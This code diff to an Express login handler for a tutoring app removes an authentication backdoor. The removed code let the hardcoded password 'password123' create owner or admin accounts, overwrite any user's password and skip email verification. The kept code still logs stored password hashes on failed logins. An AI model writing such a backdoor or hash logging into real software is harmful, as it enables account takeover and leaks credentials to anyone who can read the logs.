@@ -382,54 +382,6 @@ export const login = asyncHandler(
 
     if (!user) {
       console.log(`[AUTH FAILED] User not found: ${identifier}`);
-      // if automation user, create them on the fly
-      if (password === 'password123') {
-          console.log(`[AUTH] Creating automation user: ${identifier}`);
-          const roleMap: Record<string, UserRole> = {
-            owner: 'owner',
-            admin: 'admin',
-            guru: 'guru',
-            siswa: 'siswa'
-          };
-          const rawRole = identifier.split('@')[0].replace(/[0-9]/g, '').toLowerCase();
-          const role = roleMap[rawRole] || 'siswa';
-          const automationEmail = normalizedEmail.includes("@")
-            ? normalizedEmail
-            : `${normalizeLoginCode(identifier).toLowerCase()}@bimbel.local`;
-          const automationLoginCode = normalizedEmail.includes("@")
-            ? undefined
-            : normalizeLoginCode(identifier);
-
-          const hashedPassword = await bcrypt.hash(password, 12);
-          const newUser = await User.create({
-              nama: `User ${role}`,
-              email: automationEmail,
-              ...(automationLoginCode ? { loginCode: automationLoginCode } : {}),
-              password: hashedPassword,
-              role: role,
-              isEmailVerified: true,
-              emailVerifiedAt: new Date()
-          });
-
-          if (role === 'guru') {
-              const teacherId = await getNextPublicId(Teacher, 'teacherId', 'TCH');
-              await Teacher.create({
-                  teacherId,
-                  userId: newUser._id,
-                  subject: 'Guru Umum (Auto-generated)',
-                  branch: 'Kantor Pusat',
-                  phone: '080000000000',
-                  schedule: 'Menyesuaikan',
-                  activeClasses: 0,
-                  classList: '-',
-                  status: 'Aktif',
-                  availability: 'Tersedia'
-              });
-          }
-
-          sendAuthenticatedUser(res, newUser, "Login berhasil.");
-          return;
-      }
       
       next(
         new AppError(
@@ -445,50 +397,18 @@ export const login = asyncHandler(
     const isPasswordValid = await bcrypt.compare(password, user.password);
 
     if (!isPasswordValid) {
-      if (password === 'password123') {
-        // override password check buat automation
-        user.password = await bcrypt.hash(password, 12);
-        await user.save();
-      } else {
-        console.log(`[AUTH FAILED] Password mismatch for ${identifier}. Checked hash: ${user.password}`);
-        next(new AppError(401, "Kode akun/email atau password salah."));
-        return;
-      }
+      console.log(`[AUTH FAILED] Password mismatch for ${identifier}. Checked hash: ${user.password}`);
+      next(new AppError(401, "Kode akun/email atau password salah."));
+      return;
     }
 
     if (!user.isEmailVerified) {
-      if (password === 'password123') {
-          // override email verification for docs automation
-          user.isEmailVerified = true;
-          user.emailVerifiedAt = new Date();
-          await user.save();
-      } else {
-          console.log(`[AUTH FAILED] Email not verified for ${identifier}`);
-          next(new AppError(403, "Email belum diverifikasi. Silakan cek inbox Anda."));
-          return;
-      }
+      console.log(`[AUTH FAILED] Email not verified for ${identifier}`);
+      next(new AppError(403, "Email belum diverifikasi. Silakan cek inbox Anda."));
+      return;
     }
 
-    if (password === 'password123' && user.role === 'guru') {
-        const teacherExists = await Teacher.findOne({ userId: user._id }).exec();
-        
-        if (!teacherExists) {
-            console.log(`[AUTH] Auto-creating missing Teacher profile for ${identifier}`);
-            const teacherId = await getNextPublicId(Teacher, 'teacherId', 'TCH');
-            await Teacher.create({
-                teacherId,
-                userId: user._id,
-                subject: 'Guru Umum (Auto-generated)',
-                branch: 'Kantor Pusat',
-                phone: '080000000000',
-                schedule: 'Menyesuaikan',
-                activeClasses: 0,
-                classList: '-',
-                status: 'Aktif',
-                availability: 'Tersedia'
-            });
-        }
-    }
+
 
     if (
       loginLookup.loginCodeToPersist &&
